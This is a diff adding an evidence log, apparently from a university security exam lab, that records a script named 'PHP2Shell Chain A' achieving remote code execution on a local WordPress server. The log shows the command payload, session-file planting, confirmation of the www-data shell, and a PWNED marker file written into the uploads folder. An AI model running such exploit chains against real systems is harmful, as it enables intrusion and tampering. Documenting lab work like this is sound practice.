@@ -1,0 +1,25 @@
+=== EV-W2-08 · PHP2Shell Chain A RCE y marcador ===
+Host: kali · Fecha UTC: 2026-10-27T21:12:12Z
+Comando:
+./informe/tools/chain-a-full.sh
+----------------------------------------------------------------------
+[*] Target: http://127.0.0.1:80
+[*] Command: id; hostname; echo PWNED-M1-www-data > /var/www/wp/wp-content/uploads/PWNED-M1.txt; ls -l /var/www/wp/wp-content/uploads/PWNED-M1.txt
+
+[attempt 1] SID=exploitedb76171c56849afaef2 file=/tmp/sess_exploitedb76171c56849afaef2
+    plant=stalled
+[+] RCE CONFIRMED: uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+7
+m1-app
+
+5b
+-rw-rw-rw- 1 www-data www-data 18 oct 27  2026 /var/www/wp/wp-content/uploads/PWNED-M1.txt
+
+7b
+
+== Marcador por HTTP ==
+PWNED-M1-www-data
+----------------------------------------------------------------------
+[exit=0] · Evidencia: /home/kali/IS-EXAMEN-UNIDAD-1/informe/evidencias/png/EV-W2-08.png
+Cierre UTC: 2026-10-27T21:12:15Z
